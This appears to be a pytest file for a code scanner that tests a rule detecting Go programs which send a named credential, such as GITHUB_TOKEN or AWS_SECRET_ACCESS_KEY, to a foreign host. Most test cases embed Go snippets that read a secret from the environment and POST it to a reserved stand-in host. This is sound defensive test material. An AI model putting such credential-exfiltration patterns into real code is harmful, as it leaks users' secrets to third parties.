"""L1 in Go: one named credential sent to a host outside its service, outside any install hook.

`SUSPECT.EXFIL.NAMED_SECRET.001` read Python and JavaScript; a Go program that read a named credential
from the environment and put it in a request to another host was read by nobody (the Go credential
capability names three keys and the whole environment). The snippets are inert: they name reserved
`.invalid` hosts (RFC 2606), which resolve nowhere, and are only ever parsed, never run.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.code.secretflow import GoFlow
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.NAMED_SECRET.001"
HEAD = 'package main\n\nimport (\n\t"net/http"\n\t"os"\n\t"strings"\n)\n\n'


def fired(tmp_path: Path, name: str, body: str) -> bool:
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body, encoding="utf-8")
    result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
    return any(f.rule_id == RULE for f in result.findings)


class TestAGoProgramSendingANamedCredentialElsewhere:
    def test_a_bound_token_in_a_request_body(self, tmp_path) -> None:
        body = HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("POST", "https://c.example.invalid/v1", strings.NewReader(token))\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert fired(tmp_path, "main.go", body)

    def test_a_token_set_as_a_header_after_the_request_is_made(self, tmp_path) -> None:
        body = HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("NPM_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://c.example.invalid/v1", nil)\n'
            '\treq.Header.Set("X-Token", token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert fired(tmp_path, "main.go", body)

    def test_a_token_handed_to_a_helper_that_sends_it(self, tmp_path) -> None:
        body = HEAD + (
            "func send(k string) {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
            "}\n\n"
            "func main() {\n"
            '\tkey := os.Getenv("AWS_SECRET_ACCESS_KEY")\n'
            "\tsend(key)\n"
            "}\n"
        )
        assert fired(tmp_path, "cmd/main.go", body)

    def test_the_getenv_made_inline_in_the_call(self, tmp_path) -> None:
        body = HEAD + (
            "func send(k string) {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
            "}\n\n"
            "func main() {\n"
            '\tsend(os.Getenv("GITLAB_TOKEN"))\n'
            "}\n"
        )
        assert fired(tmp_path, "main.go", body)

    def test_a_url_bound_to_a_name(self, tmp_path) -> None:
        body = HEAD + (
            'const collector = "https://c.example.invalid/v1"\n\n'
            "func report() {\n"
            '\ttoken := os.Getenv("SLACK_BOT_TOKEN")\n'
            '\thttp.Post(collector, "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert fired(tmp_path, "main.go", body)

    def test_the_flow_reports_offset_name_and_host(self) -> None:
        text = HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        [(offset, name, host)] = GoFlow.findings(text)
        assert text[offset:].startswith("http.Post") and name == "GITHUB_TOKEN"
        assert host == "c.example.invalid"


class TestWhatIsNotAClaim:
    def test_the_token_sent_to_its_own_service(self, tmp_path) -> None:
        body = HEAD + (
            "func whoami() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    def test_a_setting_that_is_not_a_credential(self, tmp_path) -> None:
        body = HEAD + (
            "func report() {\n"
            '\tport := os.Getenv("PORT")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(port))\n'
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    def test_no_literal_host_no_claim(self, tmp_path) -> None:
        body = HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post(os.Getenv("COLLECTOR_URL"), "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    def test_a_key_that_has_no_home_we_can_know(self, tmp_path) -> None:
        body = HEAD + (
            "func report() {\n"
            '\tkey := os.Getenv("MY_SERVICE_API_KEY")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(key))\n'
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    def test_the_function_that_also_calls_the_keys_service_makes_no_claim(self, tmp_path) -> None:
        body = HEAD + (
            "func sync() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
            "\thttp.DefaultClient.Do(req)\n"
            '\thttp.Post("https://stats.example.invalid/v1", "text/plain", strings.NewReader("done"))\n'
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    def test_a_credential_read_in_another_function_than_the_send(self, tmp_path) -> None:
        body = HEAD + (
            "func load() string {\n"
            '\treturn os.Getenv("GITHUB_TOKEN")\n'
            "}\n\n"
            "func ping() {\n"
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader("up"))\n'
            "}\n"
        )
        assert not fired(tmp_path, "main.go", body)

    @pytest.mark.parametrize("name", ["main_test.go"])
    def test_a_test_file(self, tmp_path, name) -> None:
        body = HEAD + (
            "func report() {\n"
            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
            "}\n"
        )
        assert not fired(tmp_path, name, body)
